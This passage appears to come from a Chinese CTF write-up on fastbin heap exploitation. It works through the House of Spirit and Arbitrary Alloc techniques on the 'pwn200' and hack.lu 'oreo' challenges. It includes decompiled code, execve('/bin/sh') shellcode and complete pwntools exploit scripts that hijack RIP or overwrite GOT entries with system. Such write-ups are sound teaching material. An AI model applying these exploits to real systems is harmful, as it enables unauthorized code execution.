<h4 id="sub-400A29函数如下："><a href="#sub-400A29函数如下：" class="headerlink" title="sub_400A29函数如下："></a>sub_400A29函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_400A29()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; &#x2F;&#x2F; [sp+0h] [bp-40h]@1</span><br><span class="line">  char *dest; &#x2F;&#x2F; [sp+38h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  dest &#x3D; (char *)malloc(0x40uLL);</span><br><span class="line">  puts(&quot;give me money~&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x40uLL);</span><br><span class="line">  strcpy(dest, &amp;buf);</span><br><span class="line">  ptr &#x3D; dest;</span><br><span class="line">  return sub_4009C4();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>int sub_400A29()</code>中，由于buf的大小只有 0x40-0x8 = 0x38，但是却读入了0x40字节，会覆盖掉dest的指针，而dest是一个堆指针，这样就满足了HOS利用条件之一<code>存在可将堆变量指针覆盖指向为可控区域</code></p>
<h4 id="sub-4009C4函数如下："><a href="#sub-4009C4函数如下：" class="headerlink" title="sub_4009C4函数如下："></a>sub_4009C4函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_4009C4()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; &#x2F;&#x2F; eax@1</span><br><span class="line"></span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4009AF();</span><br><span class="line">      v0 &#x3D; sub_4007DF();</span><br><span class="line">      if ( v0 !&#x3D; 2 )</span><br><span class="line">        break;</span><br><span class="line">      free_();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v0 &#x3D;&#x3D; 3 )</span><br><span class="line">      break;</span><br><span class="line">    if ( v0 &#x3D;&#x3D; 1 )</span><br><span class="line">      add();</span><br><span class="line">    else</span><br><span class="line">      puts(&quot;invalid choice&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return puts(&quot;good bye~&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="free函数如下："><a href="#free函数如下：" class="headerlink" title="free函数如下："></a>free函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void free_()</span><br><span class="line">&#123;</span><br><span class="line">  if ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out~&quot;);</span><br><span class="line">    free(ptr);</span><br><span class="line">    ptr &#x3D; 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;havn&#39;t check in&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="add函数如下：-1"><a href="#add函数如下：-1" class="headerlink" title="add函数如下："></a>add函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int add()</span><br><span class="line">&#123;</span><br><span class="line">  int result; &#x2F;&#x2F; eax@4</span><br><span class="line">  int nbytes; &#x2F;&#x2F; [sp+Ch] [bp-4h]@2</span><br><span class="line"></span><br><span class="line">  if ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; puts(&quot;already check in&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;how long?&quot;);</span><br><span class="line">    nbytes &#x3D; sub_4007DF();</span><br><span class="line">    if ( nbytes &lt;&#x3D; 0 || nbytes &gt; 128 )</span><br><span class="line">    &#123;</span><br><span class="line">      result &#x3D; puts(&quot;invalid length&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      ptr &#x3D; malloc(nbytes);</span><br><span class="line">      printf(&quot;give me more money : &quot;);</span><br><span class="line">      printf(&quot;\n%d\n&quot;, (unsigned int)nbytes);</span><br><span class="line">      read(0, ptr, (unsigned int)nbytes);</span><br><span class="line">      result &#x3D; puts(&quot;in~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还有一个利用条件是在 <code>int sub_400A8E()</code>函数中输入ID哪里，因为IDA反编译的问题没有显示出来。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400B10                 mov     edi, offset aGiveMeYourId? ; &quot;give me your id ~~?&quot;</span><br><span class="line">.text:0000000000400B15                 call    _puts</span><br><span class="line">.text:0000000000400B1A                 mov     eax, 0</span><br><span class="line">.text:0000000000400B1F                 call    sub_4007DF</span><br><span class="line">.text:0000000000400B24                 cdqe</span><br><span class="line">.text:0000000000400B26                 mov     [rbp+var_38], rax    &lt;---可以看到这里RAX中保存的就是ID</span><br><span class="line">.text:0000000000400B2A                 mov     eax, 0</span><br><span class="line">.text:0000000000400B2F                 call    sub_400A29</span><br></pre></td></tr></table></figure>

<p>这样就满足了HOS的所有利用条件，构成了上面我们在图上看到的那样。我们再看一下程序整个的栈结构。</p>
<h4 id="栈结构"><a href="#栈结构" class="headerlink" title="栈结构"></a>栈结构</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+--------------+     -----</span><br><span class="line">|  money(0x38) | &lt;-     ↓  实际可读入0x40</span><br><span class="line">----------------     sub_400A29()函数栈帧(0x40)</span><br><span class="line">|    dest      |        ↑</span><br><span class="line">----------------      -----    </span><br><span class="line">|    RBP       |        </span><br><span class="line">----------------        </span><br><span class="line">|    RIP       |         </span><br><span class="line">+--------------+      -----</span><br><span class="line">|     .....    | 0x18   ↓  </span><br><span class="line">----------------        ↓</span><br><span class="line">|     ID       |     sub_400A8E()函数栈帧(0x50) </span><br><span class="line">----------------        ↑</span><br><span class="line">|   name(0x30) |        ↑</span><br><span class="line">-----------------     -----  </span><br><span class="line">|    RBP       |    这里存的是main函数的RBP </span><br><span class="line">----------------        </span><br><span class="line">|    RIP       |        </span><br><span class="line">+--------------+       --↓--</span><br><span class="line">|   .......    |        main函数栈帧(0x10)</span><br><span class="line">----------------       --↑--</span><br><span class="line">|    RBP       |        </span><br><span class="line">----------------        </span><br><span class="line">|    RIP       |         </span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure>

<p>这就形成了我们上面看到的情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----------------</span><br><span class="line">|  money(0x38)  |  &lt;--可控区域1</span><br><span class="line">-----------------</span><br><span class="line">|    RBP        |</span><br><span class="line">-----------------  &lt;--目标区域</span><br><span class="line">|    RIP        |</span><br><span class="line">----------------- </span><br><span class="line">|    ID         |  &lt;--可控区域2</span><br><span class="line">-----------------</span><br></pre></td></tr></table></figure>

<h4 id="利用思路：-1"><a href="#利用思路：-1" class="headerlink" title="利用思路："></a>利用思路：</h4><ol>
<li>将shellcode作为name输入进去，填充满48个字符，泄露RBP</li>
<li>输入ID为next_size</li>
<li>在输入money的地方，我们伪造fake_chunk，并且覆盖dest指针为我们fake_chunk的地址</li>
<li>free掉fake_chunk，再将fake_chunk申请回来，并且将RIP修改为shellcode_addr。</li>
<li>退出程序，getshell。</li>
</ol>
<h4 id="exp如下：-1"><a href="#exp如下：-1" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;pwn200&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn200&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line"></span><br><span class="line">def add(size,content) :</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def free() :</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line">def exit() :</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line"></span><br><span class="line">shellcode &#x3D; &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br><span class="line">sh.recvuntil(&#39;who are u?\n&#39;)</span><br><span class="line">sh.send(shellcode.ljust(46,&#39;a&#39;)+&#39;bb&#39;)</span><br><span class="line">sh.recvuntil(&#39;bb&#39;)</span><br><span class="line">rbp_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">log.success(&#39;rbp_addr:&#39; +hex(rbp_addr))</span><br><span class="line"></span><br><span class="line">shellcode_addr&#x3D;rbp_addr-0x50</span><br><span class="line">fake_addr&#x3D;rbp_addr-0x90</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;give me your id ~~?&#39;)</span><br><span class="line">sh.sendline(&#39;48&#39;)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;money~&#39;)</span><br><span class="line">payload &#x3D; p64(0) * 5 + p64(0x41) </span><br><span class="line">payload &#x3D; payload.ljust(0x38, &#39;\x00&#39;) + p64(fake_addr) </span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">add(0x30,p64(0)*3+p64(shellcode_addr))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><p>该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p>
<p>通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持 fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的 size 值。</p>
<h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</p>
<p>因为Alloc to Stack和Arbitrary Alloc利用原理是一样的，这里就只介绍Arbitrary Alloc。</p>
<h3 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>类似于堆溢出漏洞这样的类型，可以劫持fd指针</li>
</ul>
<p>我找了几道这样类型的题，演示一下</p>
<h3 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h3><h4 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="mian函数如下："><a href="#mian函数如下：" class="headerlink" title="mian函数如下："></a>mian函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; &#x2F;&#x2F; ST1C_4@1</span><br><span class="line">  int result; &#x2F;&#x2F; eax@1</span><br><span class="line">  int v2; &#x2F;&#x2F; edx@1</span><br><span class="line"></span><br><span class="line">  v0 &#x3D; *MK_FP(__GS__, 20);</span><br><span class="line">  number &#x3D; 0;</span><br><span class="line">  dword_804A2A0 &#x3D; 0;</span><br><span class="line">  dword_804A2A8 &#x3D; (char *)&amp;unk_804A2C0;</span><br><span class="line">  puts(&quot;Welcome to the OREO Original Rifle Ecommerce Online System!&quot;);</span><br><span class="line">  puts(&quot;\n     ,______________________________________\n    |_________________,----------._ [____]  -,__  __....-----&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n                   (_(||||||||||||)___________&#x2F;                   |\n                      &#96;----------&#39;   OREO [ ))\&quot;-,                   |\n                                           \&quot;\&quot;    &#96;,  _,--....___    |\n                                                   &#96;&#x2F;           \&quot;\&quot;\&quot;\&quot;\n\t&quot;);</span><br><span class="line">  sub_804898D();</span><br><span class="line">  result &#x3D; 0;</span><br><span class="line">  v2 &#x3D; *MK_FP(__GS__, 20) ^ v0;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="sub-804898D函数如下："><a href="#sub-804898D函数如下：" class="headerlink" title="sub_804898D函数如下："></a>sub_804898D函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_804898D()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+1Ch] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  v1 &#x3D; *MK_FP(__GS__, 20);</span><br><span class="line">  puts(&quot;What would you like to do?\n&quot;);</span><br><span class="line">  printf(&quot;%u. Add new rifle\n&quot;, 1);</span><br><span class="line">  printf(&quot;%u. Show added rifles\n&quot;, 2);</span><br><span class="line">  printf(&quot;%u. Order selected rifles\n&quot;, 3);</span><br><span class="line">  printf(&quot;%u. Leave a Message with your Order\n&quot;, 4);</span><br><span class="line">  printf(&quot;%u. Show current stats\n&quot;, 5);</span><br><span class="line">  printf(&quot;%u. Exit!\n&quot;, 6);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    switch ( get_number() )</span><br><span class="line">    &#123;</span><br><span class="line">      default:</span><br><span class="line">        continue;</span><br><span class="line">      case 1:</span><br><span class="line">        Add_new_rifle();</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        Show_added_rifles();</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        delete_rifles();</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        Enter_Message();</span><br><span class="line">        break;</span><br><span class="line">      case 5:</span><br><span class="line">        Show_current_stats();</span><br><span class="line">        break;</span><br><span class="line">      case 6:</span><br><span class="line">        return *MK_FP(__GS__, 20) ^ v1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Add-new-rifle函数如下："><a href="#Add-new-rifle函数如下：" class="headerlink" title="Add_new_rifle函数如下："></a>Add_new_rifle函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_8048644()</span><br><span class="line">&#123;</span><br><span class="line">  char *v1; &#x2F;&#x2F; [sp+18h] [bp-10h]@1</span><br><span class="line">  int v2; &#x2F;&#x2F; [sp+1Ch] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; *MK_FP(__GS__, 20);</span><br><span class="line">  v1 &#x3D; last_heap;</span><br><span class="line">  last_heap &#x3D; (char *)malloc(0x38u);</span><br><span class="line">  if ( last_heap )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_DWORD *)last_heap + 13) &#x3D; v1;</span><br><span class="line">    printf(&quot;Rifle name: &quot;);</span><br><span class="line">    fgets(last_heap + 25, 56, stdin);</span><br><span class="line">    sub_80485EC(last_heap + 25);</span><br><span class="line">    printf(&quot;Rifle description: &quot;);</span><br><span class="line">    fgets(last_heap, 56, stdin);</span><br><span class="line">    sub_80485EC(last_heap);</span><br><span class="line">    ++number;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Something terrible happened!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__GS__, 20) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Show-added-rifles函数如下："><a href="#Show-added-rifles函数如下：" class="headerlink" title="Show_added_rifles函数如下："></a>Show_added_rifles函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int Show_added_rifles()</span><br><span class="line">&#123;</span><br><span class="line">  char *i; &#x2F;&#x2F; [sp+14h] [bp-14h]@1</span><br><span class="line">  int v2; &#x2F;&#x2F; [sp+1Ch] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; *MK_FP(__GS__, 20);</span><br><span class="line">  printf(&quot;Rifle to be ordered:\n%s\n&quot;, &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);</span><br><span class="line">  for ( i &#x3D; last_heap; i; i &#x3D; (char *)*((_DWORD *)i + 13) )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Name: %s\n&quot;, i + 25);</span><br><span class="line">    printf(&quot;Description: %s\n&quot;, i);</span><br><span class="line">    puts(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__GS__, 20) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="delete-rifles函数如下："><a href="#delete-rifles函数如下：" class="headerlink" title="delete_rifles函数如下："></a>delete_rifles函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_8048810()</span><br><span class="line">&#123;</span><br><span class="line">  char *ptr; &#x2F;&#x2F; ST18_4@3</span><br><span class="line">  char *v2; &#x2F;&#x2F; [sp+14h] [bp-14h]@1</span><br><span class="line">  int v3; &#x2F;&#x2F; [sp+1Ch] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; *MK_FP(__GS__, 20);</span><br><span class="line">  v2 &#x3D; last_heap;</span><br><span class="line">  if ( number )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr &#x3D; v2;</span><br><span class="line">      v2 &#x3D; (char *)*((_DWORD *)v2 + 13);</span><br><span class="line">      free(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    last_heap &#x3D; 0;</span><br><span class="line">    ++dword_804A2A0;</span><br><span class="line">    puts(&quot;Okay order submitted!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No rifles to be ordered!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__GS__, 20) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Enter-Message函数如下："><a href="#Enter-Message函数如下：" class="headerlink" title="Enter_Message函数如下："></a>Enter_Message函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_80487B4()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; &#x2F;&#x2F; ST1C_4@1</span><br><span class="line"></span><br><span class="line">  v0 &#x3D; *MK_FP(__GS__, 20);</span><br><span class="line">  printf(&quot;Enter any notice you&#39;d like to submit with your order: &quot;);</span><br><span class="line">  fgets(dword_804A2A8, 128, stdin);</span><br><span class="line">  sub_80485EC(dword_804A2A8);</span><br><span class="line">  return *MK_FP(__GS__, 20) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Show-current-stat函数如下："><a href="#Show-current-stat函数如下：" class="headerlink" title="Show_current_stat函数如下："></a>Show_current_stat函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int sub_804898D()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+1Ch] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  v1 &#x3D; *MK_FP(__GS__, 20);</span><br><span class="line">  puts(&quot;What would you like to do?\n&quot;);</span><br><span class="line">  printf(&quot;%u. Add new rifle\n&quot;, 1);</span><br><span class="line">  printf(&quot;%u. Show added rifles\n&quot;, 2);</span><br><span class="line">  printf(&quot;%u. Order selected rifles\n&quot;, 3);</span><br><span class="line">  printf(&quot;%u. Leave a Message with your Order\n&quot;, 4);</span><br><span class="line">  printf(&quot;%u. Show current stats\n&quot;, 5);</span><br><span class="line">  printf(&quot;%u. Exit!\n&quot;, 6);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    switch ( get_number() )</span><br><span class="line">    &#123;</span><br><span class="line">      default:</span><br><span class="line">        continue;</span><br><span class="line">      case 1:</span><br><span class="line">        Add_new_rifle();</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        Show_added_rifles();</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        delete_rifles();</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        Enter_Message();</span><br><span class="line">        break;</span><br><span class="line">      case 5:</span><br><span class="line">        Show_current_stats();</span><br><span class="line">        break;</span><br><span class="line">      case 6:</span><br><span class="line">        return *MK_FP(__GS__, 20) ^ v1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>add函数中 <code>*((_DWORD *)last_heap + 13) = v1;</code>将<code>last_heap</code>指针的地址写到了last_heap + 52的地方(4*13)，接着这里让输入name，我们发现<code>fgets(last_heap + 25, 56, stdin)</code>，这句代码从<code>last_heap + 25</code>开始输入，然后输入56个字符，而我们将<code>last_heap</code>指针的地址写到了last_heap + 52的地方，这就意味着我们可以改写这个指针。</p>
<h4 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h4><ol>
<li><p>因为延迟绑定的缘故，我们首先需要调用一下free函数，然后再name输入的时候，将last_heap指针改写成free_got。</p>
</li>
<li><p>然后利用show函数，泄露libc</p>
</li>
<li><p>Enter_Message函数中<code>fgets(dword_804A2A8, 128, stdin);</code>这里的dword_804A2A8指的是这个地址里的数据指向的地方，我们可以伪造fake_chunk修改dword_804A2A8这个地址的数据让它指向got表，然后修改got表。</p>
</li>
<li><p>我们发现在bss段有一个number的计数指针，用来记录malloc的次数， <code>last_heap = (char *)malloc(0x38u);</code>这里可以知道，我们需要0x38+8大小的size，也就是0x40，也就是说我们需要malloc 40次。注意这里每个chunk，last_heap都要设置成NULL，因为在后面delete的时候是依次free，这样才不会将这些chunk放入fastbin中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.bss:0804A2A4 number          dd ?                   </span><br><span class="line">.bss:0804A2A4                                         </span><br><span class="line">.bss:0804A2A8 ; char *dword_804A2A8</span><br><span class="line">.bss:0804A2A8 dword_804A2A8   dd ?      &lt;---我们要修改的地方</span><br></pre></td></tr></table></figure>
</li>
<li><p>再添加一次chunk，将last_heap设置成0x0804a2a8，这样在free一次后会将指针设置成last_heap，再将其free放入fastbin，然后再次malloc出来，这里我们需要注意的是，在free的时候，程序会检查fake_chunk的next_size，所以这里我们需要伪造next_size。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;20wx 0x804a2a4</span><br><span class="line">            (fake_size) (strlen_got)</span><br><span class="line">0x804a2a4:	0x00000040	0x0804a2c0	0x00000000	0x00000000</span><br><span class="line">0x804a2b4:	0x00000000	0x00000000	0x00000000	0x61616161</span><br><span class="line">0x804a2c4:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">                                    (last_heap)</span><br><span class="line">0x804a2d4:	0x61616161	0x61616161	0x00000000	0x61616161</span><br><span class="line">            (next_size)</span><br><span class="line">0x804a2e4:	0x00000064	0x0000000a	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后我们将last_heap再一次修改为strlen_got，将利用Enter_Message函数将system_addr和<code>/bin/sh\x00</code>写到strlen_got表里。这里要注意一下写法，<code>p32(system_addr)+&#39;;/bin/sh\x00&#39;</code>具体原理我就不解释了。</p>
</li>
</ol>
<h4 id="exp如下：-2"><a href="#exp如下：-2" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;oreo&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;oreo&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">free_got&#x3D;elf.got[&#39;free&#39;]</span><br><span class="line">log.success(&#39;free_got: &#39; +hex(free_got))</span><br><span class="line">strlen_got&#x3D;elf.got[&#39;strlen&#39;]</span><br><span class="line"></span><br><span class="line">def add(name,content) :</span><br><span class="line">	#sh.recvuntil(&#39;Action: &#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	#sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(name)</span><br><span class="line">	#sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def show() :</span><br><span class="line">	#sh.recvuntil(&#39;Action: &#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line"></span><br><span class="line">def free() :</span><br><span class="line">	#sh.recvuntil(&#39;Action: &#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line"></span><br><span class="line">def message(message) :</span><br><span class="line">        #sh.recvuntil(&#39;Action: &#39;)</span><br><span class="line">        sh.sendline(&#39;4&#39;)</span><br><span class="line">	#sh.recvuntil(&quot;: &quot;)</span><br><span class="line">	sh.sendline(message)</span><br><span class="line"></span><br><span class="line">def show_stats() :</span><br><span class="line">        #sh.recvuntil(&#39;Action: &#39;)</span><br><span class="line">        sh.sendline(&#39;5&#39;)</span><br><span class="line"></span><br><span class="line">add(&#39;L0ne1y&#39;,&#39;L0ne1y&#39;)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">name&#x3D;&#39;a&#39;*27+p32(free_got)</span><br><span class="line">add(name,&#39;L0ne1y&#39;)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(&#39;Description: &#39;)</span><br><span class="line">sh.recvuntil(&#39;Description: &#39;)</span><br><span class="line">free_addr&#x3D;u32(sh.recv(4).ljust(4,&#39;\x00&#39;))</span><br><span class="line">log.success(&#39;free_addr: &#39;+hex(free_addr))</span><br><span class="line"></span><br><span class="line">libc&#x3D;LibcSearcher(&#39;free&#39;,free_addr)</span><br><span class="line">libc_base&#x3D;free_addr-libc.dump(&#39;free&#39;)</span><br><span class="line">system_addr&#x3D;libc_base+libc.dump(&#39;system&#39;)</span><br><span class="line">log.success(&#39;system_addr: &#39; +hex(system_addr))</span><br><span class="line"></span><br><span class="line">message_addr&#x3D;0x0804A2A8</span><br><span class="line">for i in range(0x40-2-1) :</span><br><span class="line">	add(&#39;a&#39;*27+p32(0),&#39;L0ne1y&#39;)</span><br><span class="line">add(&#39;a&#39;*27+p32(message_addr),&#39;L0ne1y&#39;)</span><br><span class="line">#show_stats()</span><br><span class="line">next_size&#x3D;&#39;a&#39;*(0x20-4)+p32(0) + &#39;a&#39;*4 + p32(100)   #这里的p32(0)是要将last_heap置零，有些不太理解，调试也没发现这里是last_heap</span><br><span class="line">message(next_size)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">add(&#39;L0ne1y&#39;,p32(strlen_got))</span><br><span class="line">message(p32(system_addr)+&#39;;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017_0ctf_babyheap"></a>2017_0ctf_babyheap</h3><h4 id="checksec检查-1"><a href="#checksec检查-1" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

